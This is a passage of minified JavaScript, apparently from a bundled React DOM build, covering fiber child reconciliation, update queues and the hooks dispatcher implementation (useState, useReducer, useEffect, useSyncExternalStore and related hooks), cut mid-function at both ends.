        for (I = l(I); at < N.length; at++) yt = M(I, O, at, N[at], L), yt !== null && (t && yt.alternate !== null && I.delete(yt.key === null ? at : yt.key), T = i(yt, T, at), bt === null ? F = yt : bt.sibling = yt, bt = yt);
        return t && I.forEach(function(dl) {
          return e(O, dl);
        }), gt && Sn(O, at), F;
      }
      function W(O, T, N, L) {
        if (N == null) throw Error(c(151));
        for (var F = null, bt = null, I = T, at = T = 0, yt = null, _t = N.next(); I !== null && !_t.done; at++, _t = N.next()) {
          I.index > at ? (yt = I, I = null) : yt = I.sibling;
          var dl = D(O, I, _t.value, L);
          if (dl === null) {
            I === null && (I = yt);
            break;
          }
          t && I && dl.alternate === null && e(O, I), T = i(dl, T, at), bt === null ? F = dl : bt.sibling = dl, bt = dl, I = yt;
        }
        if (_t.done) return n(O, I), gt && Sn(O, at), F;
        if (I === null) {
          for (; !_t.done; at++, _t = N.next()) _t = Y(O, _t.value, L), _t !== null && (T = i(_t, T, at), bt === null ? F = _t : bt.sibling = _t, bt = _t);
          return gt && Sn(O, at), F;
        }
        for (I = l(I); !_t.done; at++, _t = N.next()) _t = M(I, O, at, _t.value, L), _t !== null && (t && _t.alternate !== null && I.delete(_t.key === null ? at : _t.key), T = i(_t, T, at), bt === null ? F = _t : bt.sibling = _t, bt = _t);
        return t && I.forEach(function(_m) {
          return e(O, _m);
        }), gt && Sn(O, at), F;
      }
      function Dt(O, T, N, L) {
        if (typeof N == "object" && N !== null && N.type === V && N.key === null && (N = N.props.children), typeof N == "object" && N !== null) {
          switch (N.$$typeof) {
            case X:
              t: {
                for (var F = N.key; T !== null; ) {
                  if (T.key === F) {
                    if (F = N.type, F === V) {
                      if (T.tag === 7) {
                        n(O, T.sibling), L = a(T, N.props.children), L.return = O, O = L;
                        break t;
                      }
                    } else if (T.elementType === F || typeof F == "object" && F !== null && F.$$typeof === zt && Ll(F) === T.type) {
                      n(O, T.sibling), L = a(T, N.props), ha(L, N), L.return = O, O = L;
                      break t;
                    }
                    n(O, T);
                    break;
                  } else e(O, T);
                  T = T.sibling;
                }
                N.type === V ? (L = zl(N.props.children, O.mode, L, N.key), L.return = O, O = L) : (L = mi(N.type, N.key, N.props, null, O.mode, L), ha(L, N), L.return = O, O = L);
              }
              return h(O);
            case k:
              t: {
                for (F = N.key; T !== null; ) {
                  if (T.key === F) if (T.tag === 4 && T.stateNode.containerInfo === N.containerInfo && T.stateNode.implementation === N.implementation) {
                    n(O, T.sibling), L = a(T, N.children || []), L.return = O, O = L;
                    break t;
                  } else {
                    n(O, T);
                    break;
                  }
                  else e(O, T);
                  T = T.sibling;
                }
                L = fc(N, O.mode, L), L.return = O, O = L;
              }
              return h(O);
            case zt:
              return N = Ll(N), Dt(O, T, N, L);
          }
          if (Se(N)) return Z(O, T, N, L);
          if (de(N)) {
            if (F = de(N), typeof F != "function") throw Error(c(150));
            return N = F.call(N), W(O, T, N, L);
          }
          if (typeof N.then == "function") return Dt(O, T, Ai(N), L);
          if (N.$$typeof === lt) return Dt(O, T, pi(O, N), L);
          Ti(O, N);
        }
        return typeof N == "string" && N !== "" || typeof N == "number" || typeof N == "bigint" ? (N = "" + N, T !== null && T.tag === 6 ? (n(O, T.sibling), L = a(T, N), L.return = O, O = L) : (n(O, T), L = ic(N, O.mode, L), L.return = O, O = L), h(O)) : n(O, T);
      }
      return function(O, T, N, L) {
        try {
          sa = 0;
          var F = Dt(O, T, N, L);
          return bu = null, F;
        } catch (I) {
          if (I === Eu || I === bi) throw I;
          var bt = Oe(29, I, null, O.mode);
          return bt.lanes = L, bt.return = O, bt;
        }
      };
    }
    var Gl = Ho(true), Lo = Ho(false), kn = false;
    function Ec(t) {
      t.updateQueue = {
        baseState: t.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
          pending: null,
          lanes: 0,
          hiddenCallbacks: null
        },
        callbacks: null
      };
    }
    function bc(t, e) {
      t = t.updateQueue, e.updateQueue === t && (e.updateQueue = {
        baseState: t.baseState,
        firstBaseUpdate: t.firstBaseUpdate,
        lastBaseUpdate: t.lastBaseUpdate,
        shared: t.shared,
        callbacks: null
      });
    }
    function $n(t) {
      return {
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
      };
    }
    function Pn(t, e, n) {
      var l = t.updateQueue;
      if (l === null) return null;
      if (l = l.shared, (At & 2) !== 0) {
        var a = l.pending;
        return a === null ? e.next = e : (e.next = a.next, a.next = e), l.pending = e, e = yi(t), bo(t, null, n), e;
      }
      return di(t, l, e, n), yi(t);
    }
    function da(t, e, n) {
      if (e = e.updateQueue, e !== null && (e = e.shared, (n & 4194048) !== 0)) {
        var l = e.lanes;
        l &= t.pendingLanes, n |= l, e.lanes = n, O0(t, n);
      }
    }
    function _c(t, e) {
      var n = t.updateQueue, l = t.alternate;
      if (l !== null && (l = l.updateQueue, n === l)) {
        var a = null, i = null;
        if (n = n.firstBaseUpdate, n !== null) {
          do {
            var h = {
              lane: n.lane,
              tag: n.tag,
              payload: n.payload,
              callback: null,
              next: null
            };
            i === null ? a = i = h : i = i.next = h, n = n.next;
          } while (n !== null);
          i === null ? a = i = e : i = i.next = e;
        } else a = i = e;
        n = {
          baseState: l.baseState,
          firstBaseUpdate: a,
          lastBaseUpdate: i,
          shared: l.shared,
          callbacks: l.callbacks
        }, t.updateQueue = n;
        return;
      }
      t = n.lastBaseUpdate, t === null ? n.firstBaseUpdate = e : t.next = e, n.lastBaseUpdate = e;
    }
    var Ac = false;
    function ya() {
      if (Ac) {
        var t = pu;
        if (t !== null) throw t;
      }
    }
    function ma(t, e, n, l) {
      Ac = false;
      var a = t.updateQueue;
      kn = false;
      var i = a.firstBaseUpdate, h = a.lastBaseUpdate, d = a.shared.pending;
      if (d !== null) {
        a.shared.pending = null;
        var _ = d, R = _.next;
        _.next = null, h === null ? i = R : h.next = R, h = _;
        var w = t.alternate;
        w !== null && (w = w.updateQueue, d = w.lastBaseUpdate, d !== h && (d === null ? w.firstBaseUpdate = R : d.next = R, w.lastBaseUpdate = _));
      }
      if (i !== null) {
        var Y = a.baseState;
        h = 0, w = R = _ = null, d = i;
        do {
          var D = d.lane & -536870913, M = D !== d.lane;
          if (M ? (dt & D) === D : (l & D) === D) {
            D !== 0 && D === vu && (Ac = true), w !== null && (w = w.next = {
              lane: 0,
              tag: d.tag,
              payload: d.payload,
              callback: null,
              next: null
            });
            t: {
              var Z = t, W = d;
              D = e;
              var Dt = n;
              switch (W.tag) {
                case 1:
                  if (Z = W.payload, typeof Z == "function") {
                    Y = Z.call(Dt, Y, D);
                    break t;
                  }
                  Y = Z;
                  break t;
                case 3:
                  Z.flags = Z.flags & -65537 | 128;
                case 0:
                  if (Z = W.payload, D = typeof Z == "function" ? Z.call(Dt, Y, D) : Z, D == null) break t;
                  Y = B({}, Y, D);
                  break t;
                case 2:
                  kn = true;
              }
            }
            D = d.callback, D !== null && (t.flags |= 64, M && (t.flags |= 8192), M = a.callbacks, M === null ? a.callbacks = [
              D
            ] : M.push(D));
          } else M = {
            lane: D,
            tag: d.tag,
            payload: d.payload,
            callback: d.callback,
            next: null
          }, w === null ? (R = w = M, _ = Y) : w = w.next = M, h |= D;
          if (d = d.next, d === null) {
            if (d = a.shared.pending, d === null) break;
            M = d, d = M.next, M.next = null, a.lastBaseUpdate = M, a.shared.pending = null;
          }
        } while (true);
        w === null && (_ = Y), a.baseState = _, a.firstBaseUpdate = R, a.lastBaseUpdate = w, i === null && (a.shared.lanes = 0), ll |= h, t.lanes = h, t.memoizedState = Y;
      }
    }
    function Yo(t, e) {
      if (typeof t != "function") throw Error(c(191, t));
      t.call(e);
    }
    function Go(t, e) {
      var n = t.callbacks;
      if (n !== null) for (t.callbacks = null, t = 0; t < n.length; t++) Yo(n[t], e);
    }
    var _u = U(null), Si = U(0);
    function qo(t, e) {
      t = wn, Q(Si, t), Q(_u, e), wn = t | e.baseLanes;
    }
    function Tc() {
      Q(Si, wn), Q(_u, _u.current);
    }
    function Sc() {
      wn = Si.current, G(_u), G(Si);
    }
    var Ne = U(null), Ke = null;
    function Wn(t) {
      var e = t.alternate;
      Q(Zt, Zt.current & 1), Q(Ne, t), Ke === null && (e === null || _u.current !== null || e.memoizedState !== null) && (Ke = t);
    }
    function Uc(t) {
      Q(Zt, Zt.current), Q(Ne, t), Ke === null && (Ke = t);
    }
    function jo(t) {
      t.tag === 22 ? (Q(Zt, Zt.current), Q(Ne, t), Ke === null && (Ke = t)) : tl();
    }
    function tl() {
      Q(Zt, Zt.current), Q(Ne, Ne.current);
    }
    function Re(t) {
      G(Ne), Ke === t && (Ke = null), G(Zt);
    }
    var Zt = U(0);
    function Ui(t) {
      for (var e = t; e !== null; ) {
        if (e.tag === 13) {
          var n = e.memoizedState;
          if (n !== null && (n = n.dehydrated, n === null || Br(n) || zr(n))) return e;
        } else if (e.tag === 19 && (e.memoizedProps.revealOrder === "forwards" || e.memoizedProps.revealOrder === "backwards" || e.memoizedProps.revealOrder === "unstable_legacy-backwards" || e.memoizedProps.revealOrder === "together")) {
          if ((e.flags & 128) !== 0) return e;
        } else if (e.child !== null) {
          e.child.return = e, e = e.child;
          continue;
        }
        if (e === t) break;
        for (; e.sibling === null; ) {
          if (e.return === null || e.return === t) return null;
          e = e.return;
        }
        e.sibling.return = e.return, e = e.sibling;
      }
      return null;
    }
    var On = 0, et = null, Nt = null, kt = null, xi = false, Au = false, ql = false, Oi = 0, ga = 0, Tu = null, s2 = 0;
    function Kt() {
      throw Error(c(321));
    }
    function xc(t, e) {
      if (e === null) return false;
      for (var n = 0; n < e.length && n < t.length; n++) if (!xe(t[n], e[n])) return false;
      return true;
    }
    function Oc(t, e, n, l, a, i) {
      return On = i, et = e, e.memoizedState = null, e.updateQueue = null, e.lanes = 0, H.H = t === null || t.memoizedState === null ? Ss : Xc, ql = false, i = n(l, a), ql = false, Au && (i = Ko(e, n, l, a)), Xo(t), i;
    }
    function Xo(t) {
      H.H = Ea;
      var e = Nt !== null && Nt.next !== null;
      if (On = 0, kt = Nt = et = null, xi = false, ga = 0, Tu = null, e) throw Error(c(300));
      t === null || $t || (t = t.dependencies, t !== null && vi(t) && ($t = true));
    }
    function Ko(t, e, n, l) {
      et = t;
      var a = 0;
      do {
        if (Au && (Tu = null), ga = 0, Au = false, 25 <= a) throw Error(c(301));
        if (a += 1, kt = Nt = null, t.updateQueue != null) {
          var i = t.updateQueue;
          i.lastEffect = null, i.events = null, i.stores = null, i.memoCache != null && (i.memoCache.index = 0);
        }
        H.H = Us, i = e(n, l);
      } while (Au);
      return i;
    }
    function h2() {
      var t = H.H, e = t.useState()[0];
      return e = typeof e.then == "function" ? va(e) : e, t = t.useState()[0], (Nt !== null ? Nt.memoizedState : null) !== t && (et.flags |= 1024), e;
    }
    function Nc() {
      var t = Oi !== 0;
      return Oi = 0, t;
    }
    function Rc(t, e, n) {
      e.updateQueue = t.updateQueue, e.flags &= -2053, t.lanes &= ~n;
    }
    function Dc(t) {
      if (xi) {
        for (t = t.memoizedState; t !== null; ) {
          var e = t.queue;
          e !== null && (e.pending = null), t = t.next;
        }
        xi = false;
      }
      On = 0, kt = Nt = et = null, Au = false, ga = Oi = 0, Tu = null;
    }
    function me() {
      var t = {
        memoizedState: null,
        baseState: null,
        baseQueue: null,
        queue: null,
        next: null
      };
      return kt === null ? et.memoizedState = kt = t : kt = kt.next = t, kt;
    }
    function It() {
      if (Nt === null) {
        var t = et.alternate;
        t = t !== null ? t.memoizedState : null;
      } else t = Nt.next;
      var e = kt === null ? et.memoizedState : kt.next;
      if (e !== null) kt = e, Nt = t;
      else {
        if (t === null) throw et.alternate === null ? Error(c(467)) : Error(c(310));
        Nt = t, t = {
          memoizedState: Nt.memoizedState,
          baseState: Nt.baseState,
          baseQueue: Nt.baseQueue,
          queue: Nt.queue,
          next: null
        }, kt === null ? et.memoizedState = kt = t : kt = kt.next = t;
      }
      return kt;
    }
    function Ni() {
      return {
        lastEffect: null,
        events: null,
        stores: null,
        memoCache: null
      };
    }
    function va(t) {
      var e = ga;
      return ga += 1, Tu === null && (Tu = []), t = Mo(Tu, t, e), e = et, (kt === null ? e.memoizedState : kt.next) === null && (e = e.alternate, H.H = e === null || e.memoizedState === null ? Ss : Xc), t;
    }
    function Ri(t) {
      if (t !== null && typeof t == "object") {
        if (typeof t.then == "function") return va(t);
        if (t.$$typeof === lt) return ce(t);
      }
      throw Error(c(438, String(t)));
    }
    function Bc(t) {
      var e = null, n = et.updateQueue;
      if (n !== null && (e = n.memoCache), e == null) {
        var l = et.alternate;
        l !== null && (l = l.updateQueue, l !== null && (l = l.memoCache, l != null && (e = {
          data: l.data.map(function(a) {
            return a.slice();
          }),
          index: 0
        })));
      }
      if (e == null && (e = {
        data: [],
        index: 0
      }), n === null && (n = Ni(), et.updateQueue = n), n.memoCache = e, n = e.data[e.index], n === void 0) for (n = e.data[e.index] = Array(t), l = 0; l < t; l++) n[l] = Te;
      return e.index++, n;
    }
    function Nn(t, e) {
      return typeof e == "function" ? e(t) : e;
    }
    function Di(t) {
      var e = It();
      return zc(e, Nt, t);
    }
    function zc(t, e, n) {
      var l = t.queue;
      if (l === null) throw Error(c(311));
      l.lastRenderedReducer = n;
      var a = t.baseQueue, i = l.pending;
      if (i !== null) {
        if (a !== null) {
          var h = a.next;
          a.next = i.next, i.next = h;
        }
        e.baseQueue = a = i, l.pending = null;
      }
      if (i = t.baseState, a === null) t.memoizedState = i;
      else {
        e = a.next;
        var d = h = null, _ = null, R = e, w = false;
        do {
          var Y = R.lane & -536870913;
          if (Y !== R.lane ? (dt & Y) === Y : (On & Y) === Y) {
            var D = R.revertLane;
            if (D === 0) _ !== null && (_ = _.next = {
              lane: 0,
              revertLane: 0,
              gesture: null,
              action: R.action,
              hasEagerState: R.hasEagerState,
              eagerState: R.eagerState,
              next: null
            }), Y === vu && (w = true);
            else if ((On & D) === D) {
              R = R.next, D === vu && (w = true);
              continue;
            } else Y = {
              lane: 0,
              revertLane: R.revertLane,
              gesture: null,
              action: R.action,
              hasEagerState: R.hasEagerState,
              eagerState: R.eagerState,
              next: null
            }, _ === null ? (d = _ = Y, h = i) : _ = _.next = Y, et.lanes |= D, ll |= D;
            Y = R.action, ql && n(i, Y), i = R.hasEagerState ? R.eagerState : n(i, Y);
          } else D = {
            lane: Y,
            revertLane: R.revertLane,
            gesture: R.gesture,
            action: R.action,
            hasEagerState: R.hasEagerState,
            eagerState: R.eagerState,
            next: null
          }, _ === null ? (d = _ = D, h = i) : _ = _.next = D, et.lanes |= Y, ll |= Y;
          R = R.next;
        } while (R !== null && R !== e);
        if (_ === null ? h = i : _.next = d, !xe(i, t.memoizedState) && ($t = true, w && (n = pu, n !== null))) throw n;
        t.memoizedState = i, t.baseState = h, t.baseQueue = _, l.lastRenderedState = i;
      }
      return a === null && (l.lanes = 0), [
        t.memoizedState,
        l.dispatch
      ];
    }
    function Mc(t) {
      var e = It(), n = e.queue;
      if (n === null) throw Error(c(311));
      n.lastRenderedReducer = t;
      var l = n.dispatch, a = n.pending, i = e.memoizedState;
      if (a !== null) {
        n.pending = null;
        var h = a = a.next;
        do
          i = t(i, h.action), h = h.next;
        while (h !== a);
        xe(i, e.memoizedState) || ($t = true), e.memoizedState = i, e.baseQueue === null && (e.baseState = i), n.lastRenderedState = i;
      }
      return [
        i,
        l
      ];
    }
    function Qo(t, e, n) {
      var l = et, a = It(), i = gt;
      if (i) {
        if (n === void 0) throw Error(c(407));
        n = n();
      } else n = e();
      var h = !xe((Nt || a).memoizedState, n);
      if (h && (a.memoizedState = n, $t = true), a = a.queue, Hc(Io.bind(null, l, a, t), [
        t
      ]), a.getSnapshot !== e || h || kt !== null && kt.memoizedState.tag & 1) {
        if (l.flags |= 2048, Su(9, {
          destroy: void 0
        }, Zo.bind(null, l, a, n, e), null), Ct === null) throw Error(c(349));
        i || (On & 127) !== 0 || Vo(l, e, n);
      }
      return n;
    }
    function Vo(t, e, n) {
      t.flags |= 16384, t = {
        getSnapshot: e,
        value: n
      }, e = et.updateQueue, e === null ? (e = Ni(), et.updateQueue = e, e.stores = [
        t
      ]) : (n = e.stores, n === null ? e.stores = [
        t
      ] : n.push(t));
    }
    function Zo(t, e, n, l) {
      e.value = n, e.getSnapshot = l, Jo(e) && Fo(t);
    }
    function Io(t, e, n) {
      return n(function() {
        Jo(e) && Fo(t);
      });
    }
    function Jo(t) {
      var e = t.getSnapshot;
      t = t.value;
      try {
        var n = e();
        return !xe(t, n);
      } catch {
        return true;
      }
    }
    function Fo(t) {
      var e = Bl(t, 2);
      e !== null && Ae(e, t, 2);
    }
    function Cc(t) {
      var e = me();
      if (typeof t == "function") {
        var n = t;
        if (t = n(), ql) {
          z(true);
          try {
            n();
          } finally {
            z(false);
          }
        }
      }
      return e.memoizedState = e.baseState = t, e.queue = {
        pending: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: Nn,
        lastRenderedState: t
      }, e;
    }
    function ko(t, e, n, l) {
      return t.baseState = n, zc(t, Nt, typeof l == "function" ? l : Nn);
    }
    function d2(t, e, n, l, a) {
      if (Mi(t)) throw Error(c(485));
      if (t = e.action, t !== null) {
        var i = {
          payload: a,
          action: t,
          next: null,
          isTransition: true,
          status: "pending",
          value: null,
          reason: null,
          listeners: [],
          then: function(h) {
            i.listeners.push(h);
          }
        };
        H.T !== null ? n(true) : i.isTransition = false, l(i), n = e.pending, n === null ? (i.next = e.pending = i, $o(e, i)) : (i.next = n.next, e.pending = n.next = i);
      }
    }
    function $o(t, e) {
      var n = e.action, l = e.payload, a = t.state;
      if (e.isTransition) {
        var i = H.T, h = {};
        H.T = h;
        try {
          var d = n(a, l), _ = H.S;
          _ !== null && _(h, d), Po(t, e, d);
        } catch (R) {
          wc(t, e, R);
        } finally {
          i !== null && h.types !== null && (i.types = h.types), H.T = i;
        }
      } else try {
        i = n(a, l), Po(t, e, i);
      } catch (R) {
        wc(t, e, R);
      }
    }
    function Po(t, e, n) {
      n !== null && typeof n == "object" && typeof n.then == "function" ? n.then(function(l) {
        Wo(t, e, l);
      }, function(l) {
        return wc(t, e, l);
      }) : Wo(t, e, n);
    }
    function Wo(t, e, n) {
      e.status = "fulfilled", e.value = n, ts(e), t.state = n, e = t.pending, e !== null && (n = e.next, n === e ? t.pending = null : (n = n.next, e.next = n, $o(t, n)));
    }
    function wc(t, e, n) {
      var l = t.pending;
      if (t.pending = null, l !== null) {
        l = l.next;
        do
          e.status = "rejected", e.reason = n, ts(e), e = e.next;
        while (e !== l);
      }
      t.action = null;
    }
    function ts(t) {
      t = t.listeners;
      for (var e = 0; e < t.length; e++) (0, t[e])();
    }
    function es(t, e) {
      return e;
    }
    function ns(t, e) {
      if (gt) {
        var n = Ct.formState;
        if (n !== null) {
          t: {
            var l = et;
            if (gt) {
              if (Ht) {
                e: {
                  for (var a = Ht, i = Xe; a.nodeType !== 8; ) {
                    if (!i) {
                      a = null;
                      break e;
                    }
                    if (a = Qe(a.nextSibling), a === null) {
                      a = null;
                      break e;
                    }
                  }
                  i = a.data, a = i === "F!" || i === "F" ? a : null;
                }
                if (a) {
                  Ht = Qe(a.nextSibling), l = a.data === "F!";
                  break t;
                }
              }
              Jn(l);
            }
            l = false;
          }
          l && (e = n[0]);
        }
      }
      return n = me(), n.memoizedState = n.baseState = e, l = {
        pending: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: es,
        lastRenderedState: e
      }, n.queue = l, n = _s.bind(null, et, l), l.dispatch = n, l = Cc(false), i = jc.bind(null, et, false, l.queue), l = me(), a = {
        state: e,
        dispatch: null,
        action: t,
        pending: null
      }, l.queue = a, n = d2.bind(null, et, a, i, n), a.dispatch = n, l.memoizedState = t, [
        e,
        n,
        false
      ];
    }
    function ls(t) {
      var e = It();
      return us(e, Nt, t);
    }
    function us(t, e, n) {
      if (e = zc(t, e, es)[0], t = Di(Nn)[0], typeof e == "object" && e !== null && typeof e.then == "function") try {
        var l = va(e);
      } catch (h) {
        throw h === Eu ? bi : h;
      }
      else l = e;
      e = It();
      var a = e.queue, i = a.dispatch;
      return n !== e.memoizedState && (et.flags |= 2048, Su(9, {
        destroy: void 0
      }, y2.bind(null, a, n), null)), [
        l,
        i,
        t
      ];
    }
    function y2(t, e) {
      t.action = e;
    }
    function as(t) {
      var e = It(), n = Nt;
      if (n !== null) return us(e, n, t);
      It(), e = e.memoizedState, n = It();
      var l = n.queue.dispatch;
      return n.memoizedState = t, [
        e,
        l,
        false
      ];
    }
    function Su(t, e, n, l) {
      return t = {
        tag: t,
        create: n,
        deps: l,
        inst: e,
        next: null
      }, e = et.updateQueue, e === null && (e = Ni(), et.updateQueue = e), n = e.lastEffect, n === null ? e.lastEffect = t.next = t : (l = n.next, n.next = t, t.next = l, e.lastEffect = t), t;
    }
    function is() {
      return It().memoizedState;
    }
    function Bi(t, e, n, l) {
      var a = me();
      et.flags |= t, a.memoizedState = Su(1 | e, {
        destroy: void 0
      }, n, l === void 0 ? null : l);
    }
    function zi(t, e, n, l) {
      var a = It();
      l = l === void 0 ? null : l;
      var i = a.memoizedState.inst;
      Nt !== null && l !== null && xc(l, Nt.memoizedState.deps) ? a.memoizedState = Su(e, i, n, l) : (et.flags |= t, a.memoizedState = Su(1 | e, i, n, l));
    }
    function fs(t, e) {
      Bi(8390656, 8, t, e);
    }
    function Hc(t, e) {
      zi(2048, 8, t, e);
    }
    function m2(t) {
      et.flags |= 4;
      var e = et.updateQueue;
      if (e === null) e = Ni(), et.updateQueue = e, e.events = [
        t
      ];
      else {
        var n = e.events;
        n === null ? e.events = [
          t
        ] : n.push(t);
      }
    }
    function cs(t) {
      var e = It().memoizedState;
      return m2({
        ref: e,
        nextImpl: t
      }), function() {
        if ((At & 2) !== 0) throw Error(c(440));
        return e.impl.apply(void 0, arguments);
      };
    }
    function rs(t, e) {
      return zi(4, 2, t, e);
    }
    function os(t, e) {
      return zi(4, 4, t, e);
    }
    function ss(t, e) {
      if (typeof e == "function") {
        t = t();
        var n = e(t);
        return function() {
          typeof n == "function" ? n() : e(null);
        };
      }
      if (e != null) return t = t(), e.current = t, function() {
        e.current = null;
      };
    }
    function hs(t, e, n) {
      n = n != null ? n.concat([
        t
      ]) : null, zi(4, 4, ss.bind(null, e, t), n);
    }
    function Lc() {
    }
    function ds(t, e) {
      var n = It();
      e = e === void 0 ? null : e;
      var l = n.memoizedState;
      return e !== null && xc(e, l[1]) ? l[0] : (n.memoizedState = [
        t,
        e
      ], t);
    }
    function ys(t, e) {
      var n = It();
      e = e === void 0 ? null : e;
      var l = n.memoizedState;
      if (e !== null && xc(e, l[1])) return l[0];
      if (l = t(), ql) {
        z(true);
        try {
          t();
        } finally {
          z(false);
        }
      }
      return n.memoizedState = [
        l,
        e
      ], l;
    }
    function Yc(t, e, n) {
      return n === void 0 || (On & 1073741824) !== 0 && (dt & 261930) === 0 ? t.memoizedState = e : (t.memoizedState = n, t = m1(), et.lanes |= t, ll |= t, n);
    }
    function ms(t, e, n, l) {
      return xe(n, e) ? n : _u.current !== null ? (t = Yc(t, n, l), xe(t, e) || ($t = true), t) : (On & 42) === 0 || (On & 1073741824) !== 0 && (dt & 261930) === 0 ? ($t = true, t.memoizedState = n) : (t = m1(), et.lanes |= t, ll |= t, e);
    }
    function gs(t, e, n, l, a) {
      var i = K.p;
      K.p = i !== 0 && 8 > i ? i : 8;
      var h = H.T, d = {};
      H.T = d, jc(t, false, e, n);
      try {
        var _ = a(), R = H.S;
        if (R !== null && R(d, _), _ !== null && typeof _ == "object" && typeof _.then == "function") {
          var w = o2(_, l);
          pa(t, e, w, ze(t));
        } else pa(t, e, l, ze(t));
      } catch (Y) {
        pa(t, e, {
          then: function() {
          },
          status: "rejected",
          reason: Y
        }, ze());
      } finally {
        K.p = i, h !== null && d.types !== null && (h.types = d.types), H.T = h;
      }
    }
    function g2() {
    }
    function Gc(t, e, n, l) {
      if (t.tag !== 5) throw Error(c(476));
      var a = vs(t).queue;
      gs(t, a, e, P, n === null ? g2 : function() {
        return ps(t), n(l);
      });
    }
    function vs(t) {
      var e = t.memoizedState;
      if (e !== null) return e;
      e = {
        memoizedState: P,
        baseState: P,
        baseQueue: null,
        queue: {
          pending: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: Nn,
          lastRenderedState: P
        },
        next: null
      };
      var n = {};
      return e.next = {
        memoizedState: n,
        baseState: n,
        baseQueue: null,
        queue: {
          pending: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: Nn,
          lastRenderedState: n
        },
        next: null
      }, t.memoizedState = e, t = t.alternate, t !== null && (t.memoizedState = e), e;
    }
    function ps(t) {
      var e = vs(t);
      e.next === null && (e = t.alternate.memoizedState), pa(t, e.next.queue, {}, ze());
    }
    function qc() {
      return ce(wa);
    }
    function Es() {
      return It().memoizedState;
    }
    function bs() {
      return It().memoizedState;
    }
    function v2(t) {
      for (var e = t.return; e !== null; ) {
        switch (e.tag) {
          case 24:
          case 3:
            var n = ze();
            t = $n(n);
            var l = Pn(e, t, n);
            l !== null && (Ae(l, e, n), da(l, e, n)), e = {
              cache: mc()
            }, t.payload = e;
            return;
        }
        e = e.return;
      }
    }
    function p2(t, e, n) {
      var l = ze();
      n = {
        lane: l,
        revertLane: 0,
        gesture: null,
        action: n,
        hasEagerState: false,
        eagerState: null,
        next: null
      }, Mi(t) ? As(e, n) : (n = uc(t, e, n, l), n !== null && (Ae(n, t, l), Ts(n, e, l)));
    }
    function _s(t, e, n) {
      var l = ze();
      pa(t, e, n, l);
    }
    function pa(t, e, n, l) {
      var a = {
        lane: l,
        revertLane: 0,
        gesture: null,
        action: n,
        hasEagerState: false,
        eagerState: null,
        next: null
      };
      if (Mi(t)) As(e, a);
      else {
        var i = t.alternate;
        if (t.lanes === 0 && (i === null || i.lanes === 0) && (i = e.lastRenderedReducer, i !== null)) try {
          var h = e.lastRenderedState, d = i(h, n);
          if (a.hasEagerState = true, a.eagerState = d, xe(d, h)) return di(t, e, a, 0), Ct === null && hi(), false;
        } catch {
        }
        if (n = uc(t, e, a, l), n !== null) return Ae(n, t, l), Ts(n, e, l), true;
      }
      return false;
    }
    function jc(t, e, n, l) {
      if (l = {
        lane: 2,
        revertLane: Er(),
        gesture: null,
        action: l,
        hasEagerState: false,
        eagerState: null,
        next: null
      }, Mi(t)) {
        if (e) throw Error(c(479));
      } else e = uc(t, n, l, 2), e !== null && Ae(e, t, 2);
    }
    function Mi(t) {
      var e = t.alternate;
      return t === et || e !== null && e === et;
    }
    function As(t, e) {
      Au = xi = true;
      var n = t.pending;
      n === null ? e.next = e : (e.next = n.next, n.next = e), t.pending = e;
    }
    function Ts(t, e, n) {
      if ((n & 4194048) !== 0) {
        var l = e.lanes;
        l &= t.pendingLanes, n |= l, e.lanes = n, O0(t, n);
      }
    }
    var Ea = {
      readContext: ce,
      use: Ri,
      useCallback: Kt,
      useContext: Kt,
      useEffect: Kt,
      useImperativeHandle: Kt,
      useLayoutEffect: Kt,
      useInsertionEffect: Kt,
      useMemo: Kt,
      useReducer: Kt,
      useRef: Kt,
      useState: Kt,
      useDebugValue: Kt,
      useDeferredValue: Kt,
      useTransition: Kt,
      useSyncExternalStore: Kt,
      useId: Kt,
      useHostTransitionStatus: Kt,
      useFormState: Kt,
      useActionState: Kt,
      useOptimistic: Kt,
      useMemoCache: Kt,
      useCacheRefresh: Kt
    };
    Ea.useEffectEvent = Kt;
    var Ss = {
      readContext: ce,
      use: Ri,
      useCallback: function(t, e) {
        return me().memoizedState = [
          t,
          e === void 0 ? null : e
        ], t;
      },
      useContext: ce,
      useEffect: fs,
      useImperativeHandle: function(t, e, n) {
        n = n != null ? n.concat([
          t
        ]) : null, Bi(4194308, 4, ss.bind(null, e, t), n);
      },
      useLayoutEffect: function(t, e) {
        return Bi(4194308, 4, t, e);
      },
      useInsertionEffect: function(t, e) {
        Bi(4, 2, t, e);
      },
      useMemo: function(t, e) {
        var n = me();
        e = e === void 0 ? null : e;
        var l = t();
        if (ql) {
          z(true);
          try {
            t();
          } finally {
            z(false);
          }
        }
        return n.memoizedState = [
          l,
          e
        ], l;
      },
      useReducer: function(t, e, n) {
        var l = me();
        if (n !== void 0) {
          var a = n(e);
          if (ql) {
            z(true);
            try {
              n(e);
            } finally {
              z(false);
            }
          }
        } else a = e;
        return l.memoizedState = l.baseState = a, t = {
          pending: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: t,
          lastRenderedState: a
        }, l.queue = t, t = t.dispatch = p2.bind(null, et, t), [
          l.memoizedState,
          t
        ];
      },
      useRef: function(t) {
        var e = me();
        return t = {
          current: t
        }, e.memoizedState = t;
      },
      useState: function(t) {
        t = Cc(t);
        var e = t.queue, n = _s.bind(null, et, e);
        return e.dispatch = n, [
          t.memoizedState,
          n
        ];
      },
      useDebugValue: Lc,
      useDeferredValue: function(t, e) {
        var n = me();
        return Yc(n, t, e);
      },
      useTransition: function() {
        var t = Cc(false);
        return t = gs.bind(null, et, t.queue, true, false), me().memoizedState = t, [
          false,
          t
        ];
      },
      useSyncExternalStore: function(t, e, n) {
        var l = et, a = me();
        if (gt) {
          if (n === void 0) throw Error(c(407));
          n = n();
        } else {
          if (n = e(), Ct === null) throw Error(c(349));
          (dt & 127) !== 0 || Vo(l, e, n);
        }
        a.memoizedState = n;
        var i = {
          value: n,
          getSnapshot: e
        };
        return a.queue = i, fs(Io.bind(null, l, i, t), [
          t
        ]), l.flags |= 2048, Su(9, {
          destroy: void 0
        }, Zo.bind(null, l, i, n, e), null), n;
      },
      useId: function() {
        var t = me(), e = Ct.identifierPrefix;
        if (gt) {
          var n = cn, l = fn;
